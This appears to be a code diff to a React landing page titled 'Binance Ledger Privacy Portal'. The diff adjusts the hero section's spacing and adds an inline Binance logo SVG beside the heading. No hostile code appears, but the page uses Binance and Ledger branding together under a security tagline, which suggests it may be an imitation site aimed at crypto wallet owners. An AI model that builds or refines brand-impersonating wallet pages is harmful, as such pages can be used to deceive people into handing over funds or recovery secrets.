@@ -27,14 +27,25 @@ const Index = () => {
       <BinanceHeader />
       
       <main className="flex-grow relative">
-        {/* Hero Section - increased height for better image visibility */}
-        <div className="bg-binance-dark py-12 md:py-16 lg:py-20 relative overflow-hidden">
+        {/* Hero Section - improved title positioning */}
+        <div className="bg-binance-dark py-8 md:py-12 relative overflow-hidden">
           <div className="container mx-auto px-4">
             <div className="max-w-5xl mx-auto">
               <div className="flex flex-col items-center text-center relative z-10">
-                <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold mb-3 md:mb-4">
-                  Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
-                </h1>
+                {/* Binance logo icon with title */}
+                <div className="flex items-center justify-center mb-4">
+                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="mr-3">
+                    <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
+                    <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
+                    <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
+                    <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
+                    <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
+                    <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
+                  </svg>
+                  <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold">
+                    Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
+                  </h1>
+                </div>
                 <p className="text-gray-300 text-sm md:text-base mb-4 md:mb-6 max-w-2xl px-2 md:px-0">
                   Secure your crypto assets with the most trusted hardware wallet in the industry
                 </p>
